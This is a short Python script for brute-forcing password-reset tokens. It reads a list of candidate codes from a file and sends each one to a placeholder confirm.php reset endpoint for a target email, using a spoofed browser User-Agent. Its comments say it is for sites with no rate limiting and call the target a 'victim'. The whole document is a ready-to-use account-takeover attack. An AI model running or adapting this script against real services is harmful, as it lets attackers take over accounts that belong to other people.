import requests
path = 'userIDs' #specify the text file where tokens are stored, run "GenerateTokens.py to generate tokens of specific length"
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
fh = open('userIDs')
while True:
	content = fh.readline()
	token=content
	print(content)
	r = requests.get('https://<URL>/confirm.php?email=<Email_Id>&code='+token+'&action=reset_password',headers=headers)
	print(r.url)
	print(r.status_code)
	if not content:
		break
fh.close()

#Came across some programs where password reset tokens were used. Also, the catch here is that no "Rate-Limit" mechanism was in use. 
#Just run the GenerateTokens.py script to get list and bruteforce on victim id. May come in handy someday.
